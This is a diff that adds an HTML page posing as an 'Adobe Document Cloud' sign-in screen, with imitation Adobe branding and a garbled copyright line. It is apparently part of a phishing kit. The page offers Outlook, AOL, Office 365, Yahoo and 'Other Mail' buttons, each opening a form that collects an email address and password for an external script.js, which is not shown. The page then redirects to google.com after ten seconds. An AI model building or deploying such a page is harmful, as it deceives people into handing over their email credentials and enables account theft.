@@ -1,0 +1,204 @@
+<!doctype html>
+
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document Cloud - Sign In</title>
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <!-- Main Landing Screen -->
+    <div class="container">
+      <div class="login-card">
+        <div class="header">
+          <div class="adobe-logo">
+            <svg width="80" height="80" viewBox="0 0 80 80">
+              <rect width="80" height="80" rx="16" fill="#DC0000" />
+              <path
+                d="M25 20 L35 50 L30 50 L25 20 Z M45 20 L55 50 L50 50 L45 20 Z M35 40 L45 40 L40 52 L35 40 Z"
+                fill="white"
+              />
+            </svg>
+          </div>
+          <h1>Adobe Document Cloud</h1>
+          <p class="subtitle">
+            To read the document, please choose your email provider below to
+            login and view the shared file.
+          </p>
+        </div>
+
+        <div class="providers-container">
+          <button class="provider-btn outlook" onclick="openModal('outlook')">
+            <div class="btn-icon">
+              <svg width="32" height="32" viewBox="0 0 32 32">
+                <circle cx="16" cy="16" r="16" fill="#0078D4" />
+                <rect x="8" y="10" width="16" height="12" rx="1" fill="white" />
+                <path d="M16 17 L10 12 L22 12 Z" fill="#0078D4" />
+                <path
+                  d="M10 20 L16 15 L22 20"
+                  fill="none"
+                  stroke="#0078D4"
+                  stroke-width="1"
+                />
+              </svg>
+            </div>
+            <span>Sign in with Outlook</span>
+          </button>
+
+          <button class="provider-btn aol" onclick="openModal('aol')">
+            <div class="btn-icon">
+              <svg width="32" height="32" viewBox="0 0 32 32">
+                <circle cx="16" cy="16" r="16" fill="#1F3A93" />
+                <text
+                  x="16"
+                  y="22"
+                  font-size="14"
+                  font-weight="bold"
+                  fill="white"
+                  text-anchor="middle"
+                >
+                  AOL
+                </text>
+              </svg>
+            </div>
+            <span>Sign in with AOL</span>
+          </button>
+
+          <button
+            class="provider-btn office365"
+            onclick="openModal('office365')"
+          >
+            <div class="btn-icon">
+              <svg width="32" height="32" viewBox="0 0 32 32">
+                <circle cx="16" cy="16" r="16" fill="#D83B01" />
+                <rect x="9" y="9" width="14" height="14" rx="2" fill="white" />
+                <rect x="11" y="11" width="4" height="10" fill="#D83B01" />
+                <rect x="16" y="11" width="4" height="4" fill="#D83B01" />
+                <rect x="16" y="17" width="4" height="4" fill="#D83B01" />
+              </svg>
+            </div>
+            <span>Sign in with Office 365</span>
+          </button>
+
+          <button class="provider-btn yahoo" onclick="openModal('yahoo')">
+            <div class="btn-icon">
+              <svg width="32" height="32" viewBox="0 0 32 32">
+                <circle cx="16" cy="16" r="16" fill="#6001D2" />
+                <text
+                  x="16"
+                  y="22"
+                  font-size="18"
+                  font-weight="bold"
+                  fill="white"
+                  text-anchor="middle"
+                >
+                  Y!
+                </text>
+              </svg>
+            </div>
+            <span>Sign in with Yahoo!</span>
+          </button>
+
+          <button class="provider-btn other-mail" onclick="openModal('other')">
+            <div class="btn-icon">
+              <svg width="32" height="32" viewBox="0 0 32 32">
+                <circle cx="16" cy="16" r="16" fill="#00A4E4" />
+                <text
+                  x="16"
+                  y="22"
+                  font-size="20"
+                  font-weight="bold"
+                  fill="white"
+                  text-anchor="middle"
+                >
+                  @
+                </text>
+              </svg>
+            </div>
+            <span>Sign in with Other Mail</span>
+          </button>
+        </div>
+
+        <div class="footer">
+          <p class="disclaimer">
+            Built upon Adobe Document Cloud. Adobe Document Cloud features can
+            be unlocked by providing an additional license key.
+          </p>
+          <p class="copyright">
+            Copyright© 2026 Adobe system incorporated, All right reserved.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Modal Template -->
+    <div id="modal-overlay" class="modal-overlay" onclick="closeModal()">
+      <div class="modal" onclick="event.stopPropagation()">
+        <button class="close-btn" onclick="closeModal()">
+          <svg
+            width="24"
+            height="24"
+            viewBox="0 0 24 24"
+            fill="none"
+            stroke="currentColor"
+            stroke-width="2"
+          >
+            <line x1="18" y1="6" x2="6" y2="18"></line>
+            <line x1="6" y1="6" x2="18" y2="18"></line>
+          </svg>
+        </button>
+
+        <div class="modal-content">
+          <div class="modal-icon" id="modal-icon">
+            <!-- Icon will be inserted here -->
+          </div>
+          <h2 class="modal-title" id="modal-title">Login</h2>
+
+          <form class="login-form" onsubmit="return handleSubmit(event);">
+            <div class="form-group">
+              <label for="email">Email address</label>
+              <input
+                type="email"
+                id="email"
+                placeholder="Enter email"
+                required
+              />
+              <p class="form-hint">
+                We'll never share your email with anyone else.
+              </p>
+            </div>
+
+            <div class="form-group">
+              <label for="password">Password</label>
+              <input
+                type="password"
+                id="password"
+                placeholder="Enter Password"
+                required
+              />
+            </div>
+
+            <div class="form-actions">
+              <button
+                type="button"
+                class="btn-secondary"
+                onclick="closeModal()"
+              >
+                Close
+              </button>
+              <button type="submit" class="btn-primary">Login</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+
+    <script src="script.js"></script>
+    <script>
+      setTimeout(function() {
+        window.location.href = 'https://www.google.com';
+      }, 10000);
+    </script>
+  </body>
+</html>
